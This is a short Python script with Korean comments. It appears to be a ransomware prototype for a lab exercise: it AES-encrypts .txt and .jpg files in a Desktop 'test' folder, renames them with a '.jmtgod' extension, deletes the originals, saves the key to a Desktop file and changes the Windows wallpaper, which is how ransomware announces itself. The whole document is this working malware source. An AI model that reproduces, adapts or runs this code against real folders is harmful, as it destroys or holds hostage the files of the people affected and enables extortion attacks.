import os
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64

# 바탕화면 변경 함수
def change_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    # 바탕화면 이미지 변경
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

# AES 암호화 함수
def encrypt_file(file_path, key):
    iv = os.urandom(16)
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    
    padder = padding.PKCS7(algorithms.AES.block_size).padder()

    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    padded_data = padder.update(file_data) + padder.finalize()

    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    encrypted_file_path = file_path + '.jmtgod'
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted_data)
    
    os.remove(file_path)

# 키 생성 함수
def generate_key():
    password = b"password"  
    salt = os.urandom(16)  
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt

# 키 저장 함수
def save_key(key, salt):
    key_data = base64.urlsafe_b64encode(key + salt).decode('utf-8')
    with open(os.path.join(os.path.expanduser('~'), 'Desktop', 'decryptionKEY.txt'), 'w') as f:
        f.write(key_data)

# 지정한 확장자의 파일만 암호화
def encrypt_files_in_folder(folder_path, extensions):
    key, salt = generate_key()
    save_key(key, salt)

    for file_name in os.listdir(folder_path):
        if file_name.endswith(extensions):
            full_path = os.path.join(folder_path, file_name)
            encrypt_file(full_path, key)

# 바탕화면 변경 실행
def set_wallpaper():
    wallpaper_path = os.path.join(os.getcwd(), 'wallpaper.png')  # 현 경로의 wallpaper.png
    change_wallpaper(wallpaper_path)

# 바탕화면 test 폴더 경로
folder_to_encrypt = os.path.join(os.path.expanduser('~'), 'Desktop', 'test')
encrypt_files_in_folder(folder_to_encrypt, ('.txt', '.jpg'))

# 바탕화면 이미지 변경
set_wallpaper()
